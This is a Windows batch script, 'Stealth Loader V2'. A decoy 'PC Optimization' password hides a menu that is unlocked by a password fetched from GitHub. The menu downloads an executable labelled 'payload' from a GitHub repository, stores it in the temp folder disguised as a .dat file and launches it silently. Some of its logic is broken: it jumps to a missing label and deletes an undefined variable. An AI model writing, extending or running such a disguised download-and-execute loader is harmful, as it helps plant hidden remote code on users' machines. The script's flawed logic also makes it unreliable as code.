@echo off
setlocal enabledelayedexpansion

:LOGIN
cls
echo ==========================================
echo           STEALTH LOADER V2
echo ==========================================
echo.
set /p "userpass=Enter Password: "

:: Check password '1' for PC Optimization
if "%userpass%"=="1" (
    echo Launching PC Optimization Menu...
    timeout /t 2 >nul
    goto :EOF
)

:: Check secret password from GitHub
echo Verifying secret password...
curl -s -o "%temp%\remote_pass.txt" "https://raw.githubusercontent.com/maxyprime/stealthloaderv2/refs/heads/main/password.txt"
set /p secret=<"%temp%\remote_pass.txt"
del "%temp%\remote_pass.txt" >nul 2>&1

if /i "%userpass%"=="%secret%" (
    goto :STEALTH_MENU
) else (
    echo Incorrect password. Try again.
    timeout /t 2 >nul
    goto :LOGIN
)

:STEALTH_MENU
cls
echo.
echo ========== STEALTH MENU ==========
echo 1. Setup
echo 2. Run
echo 3. Bypass
echo 4. Exit
echo ==================================
set /p "choice=Choose an option: "

if "%choice%"=="1" goto :SETUP
if "%choice%"=="2" goto :RUN
if "%choice%"=="3" goto :BYPASS
if "%choice%"=="4" exit

echo Invalid choice.
timeout /t 2 >nul
goto :STEALTH_MENU

:SETUP
cls
echo ==================================================
echo              STEALTH LOADER - SETUP
echo --------------------------------------------------
echo [*] Initializing setup process...
timeout /t 1 >nul
echo [1/4] Preparing environment...
set "DISGUISED_EXE=%temp%\user_data_blob.dat"
if exist "%DISGUISED_EXE%" del /f /q "%DISGUISED_EXE%" >nul 2>&1
timeout /t 1 >nul
echo [2/4] Connecting to GitHub repository...
timeout /t 1 >nul
echo [3/4] Downloading payload: CAXVN.exe
curl -L -o "%DISGUISED_EXE%" "https://github.com/maxyprime/stealthloaderv2/raw/main/CAXVN.exe"
if not exist "%DISGUISED_EXE%" (
    echo [X] Download failed. Please check your connection or GitHub link.
    pause
    goto MENU
)
echo [✓] Download complete.
echo [4/4] Verifying and finalizing setup...
timeout /t 1 >nul
echo [✓] %DISGUISED_EXE% is ready.
echo --------------------------------------------------
echo [✓] Setup completed successfully.
echo --------------------------------------------------
pause
goto MENU




:RUN
cls
echo ==================================================
echo              STEALTH LOADER - RUN
echo --------------------------------------------------
echo [*] Preparing to launch disguised EXE...
if not exist "%temp%\user_data_blob.dat" (
    echo [X] Disguised EXE not found. Please run Setup first.
    pause
    goto MENU
)
echo [*] Running silently...
start "" /b "%temp%\user_data_blob.dat"

:: Optional: Wait and return to menu after launch
timeout /t 2 >nul
echo [✓] EXE launched as disguised .dat file.
echo --------------------------------------------------
pause
goto MENU




:BYPASS
echo Cleaning up...
del /f /q "%TEMP_EXE%" >nul 2>&1
echo Done.
pause
goto :STEALTH_MENU

